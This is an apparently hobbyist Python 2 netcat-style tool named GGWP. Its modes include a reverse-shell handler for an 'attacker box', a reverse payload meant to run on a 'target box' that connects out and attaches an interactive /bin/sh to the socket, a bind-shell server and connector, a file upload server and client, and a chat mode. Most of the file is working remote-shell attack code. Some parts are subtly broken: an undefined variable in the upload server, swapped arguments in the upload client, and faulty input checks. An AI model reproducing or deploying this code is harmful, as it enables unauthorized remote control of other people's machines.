import sys
import os
import subprocess
import threading
import socket
import argparse

class GGWP():

    def __init__(self):
        self.server = '0.0.0.0'
        self.s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        self.s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)


    #Reverse Payload Handler
    #Run on Attacker Box
    def reverse_handler(self,port):
        self.s.bind((self.server,port))
        self.s.listen(5)
        payload , addr = self.s.accept()
        payload.recv(1024)
        while True:
            sys.stdout.write(payload.recv(40680))
            cmd = raw_input("")+'\n'
            if cmd == 'quit' or cmd == 'exit':
                payload.close()
                sys.exit()
                break
            else:
                payload.send(cmd)
                sys.stdout.write(payload.recv(40680))

    #Reverse Connection Starter
    #Run on Target box
    def reverse_payload(self,server,port):
        self.s.connect((server,port))
        os.dup2(self.s.fileno(),0)
        os.dup2(self.s.fileno(),1)
        os.dup2(self.s.fileno(),2)
        subprocess.call(['/bin/sh','-i'])


    #Bind payload server
    #Run on Target box
    def bind_payload(self,port):
        self.s.bind((self.server,port))
        self.s.listen(5)
        target , addr = self.s.accept()
        os.dup2(target.fileno(),0)
        os.dup2(target.fileno(),1)
        os.dup2(target.fileno(),2)
        subprocess.call(['/bin/sh','-i'])


    #Bind Payload connector
    #run to attacker box
    def bind_handler(self,server,port):
        self.s.connect((server,port))
        self.s.recv(1024)
        while True:
            sys.stdout.write(self.s.recv(1024))
            cmd = raw_input("")+'\n'
            if cmd == 'quit' or cmd == 'exit':
                self.s.close()
                sys.exit(0)
                break
            else:
                self.s.send(cmd)
                sys.stdout.write(self.s.recv(40680))

        os._exit(1)


    #file uploader server site
    def file_uploadmode(self,port):
        self.s.bind((self.server,port))
        self.s.listen(5)
        client , addr = self.s.accept()
        file_buffer = ""
        while True:
            data = client.recv(2048)
            if not data:
                break
            else:
                file_buffer += data

        try:
            file = open(upload_dest,mode='wb')
            file.write(file_buffer)
            file.close()
            sys.stdout.write("[+] File Sucessfully Save To {0}\n".format(upload_dest))
        except:
            sys.stdout.write("[!] Fail To Save File!\n")
            sys.exit(0)


    #file uploader Client Site
    def file_uploader_client(self,upload_dest,port,server):
        self.s.connect((server,port))
        file = open(upload_dest,mode='rb')
        while True:
            data = file.readline()
            if not data:
                break

            self.s.send(data)

        self.s.close()
        sys.exit(0)

    #Normal Listener
    def listener(self,port):
        self.s.bind((self.server,port))
        self.s.listen(5)
        client , addr = self.s.accept()
        while True:
            sys.stdout.write(client.recv(1024))
            msg = raw_input('')+'\n'
            client.send(msg)


    #Normal Client
    def messenger(self,port,server):
        self.s.connect((server,port))
        while True:
            msg = raw_input("")+'\n'
            self.s.send(msg)
            sys.stdout.write(self.s.recv(1024))

ggwp = GGWP()

def main():
    usage = '''usage: %(prog)s [-ht host] [-p port] [-l normal listenning mode] [-rl reverse shell listening mode] [-bl bind shell listening mode]
                      [-rc reverse shell client mode] [-bc bind shell client mode] [-nc normal client mode] [-ul listening mode for upload file]
                      [-uc upload client mode] '''
    praser = argparse.ArgumentParser(usage=usage)
    praser.add_argument("-ht","--host",type=str,help="ip address of the host",action="store",dest="host")
    praser.add_argument("-p","--port",type=int,help="port to connect",dest="port",action="store")
    praser.add_argument("-l","--listen",action="store_const",dest="nl",const=1,help="listening mode for chatting :3")
    praser.add_argument("-rl","--resverse_listen",action="store_const",dest="rl",const=1,help="listen mode for reverse shell")
    praser.add_argument("-bl","--bind_listen",action="store_const",dest="bl",const=1,help="listen mode for bind shell")
    praser.add_argument("-rc","--reverse_shell_client",action="store_const",dest="rc",const=1,help="reverse shell client")
    praser.add_argument("-bc","--bind_shell_client",action="store_const",dest="bc",const=1,help="bind shell client")
    praser.add_argument("-nc","--client",action="store_const",dest="nc",const=1,help="chatting client")
    praser.add_argument("-ul","--upload_listen",action="store_const",dest="ul",const=1,help="listen mode for file uploading")
    praser.add_argument("-uc","--upload_client",type=str,action="store",dest="upload_destination",help="client mode for file uploading")
    praser.add_argument("--version",action="version",version="%(prog)s 0.1 beta")
    args = praser.parse_args()


    if len(sys.argv) == 1:
        praser.print_help()

    host = args.host
    port = args.port
    l    = args.nl
    rl   = args.rl
    bl   = args.bl
    rc   = args.rc
    bc   = args.bc
    nc   = args.nc
    ul   = args.ul
    uc   = args.upload_destination

    if l == 1:
        if port == None:
            sys.exit("[!] Please Provide Port No To Listen!")
        else:
            server_thread = threading.Thread(target=ggwp.listener,args=(port,))
            server_thread.start()
    elif rl == 1:
        if port == None:
            sys.exit("[!] Please Provide Port No To Listen!")
        else:
            server_thread = threading.Thread(target=ggwp.reverse_handler,args=(port,))
            server_thread.start()
    elif bl == 1:
        if port == None:
            sys.exit("[!] Please Provide Port No To Listen!")
        else:
            server_thread = threading.Thread(target=ggwp.bind_payload,args=(port,))
            server_thread.start()
    elif ul == 1:
        if port == None:
            sys.exit("[!] Please Provide Port No To Listen!")
        else:
            server_thread = threading.Thread(target=ggwp.file_uploadmode,args=(port,))
            server_thread.start()
    elif rc == 1:
        if port == None and host == None:
            sys.exit("[!] Please Provide Host and Port to make connection !")
        else:
            client_thread = threading.Thread(target=ggwp.reverse_payload,args=(host,port))
            client_thread.start()
    elif bc == 1:
        if port == None and host == None:
            sys.exit("[!] Please Provide Host and Port to make connection !")
        else:
            client_thread = threading.Thread(target=ggwp.bind_handler,args=(host,port))
            client_thread.start()
    elif nc == 1:
        if port == None and host == None:
            sys.exit("[!] Please Provide Host and Port to make connection !")
        else:
            client_thread = threading.Thread(target=ggwp.messenger,args=(host,port))
            client_thread.start()
    elif uc != None:
        if port == None and host == None:
            sys.exit("[!] Please Provide Host and Port to make connection !")
        else:
            client_thread = threading.Thread(target=ggwp.file_uploader_client,args=(uc,host,port))
            client_thread.start()


if __name__ == '__main__':
    main()
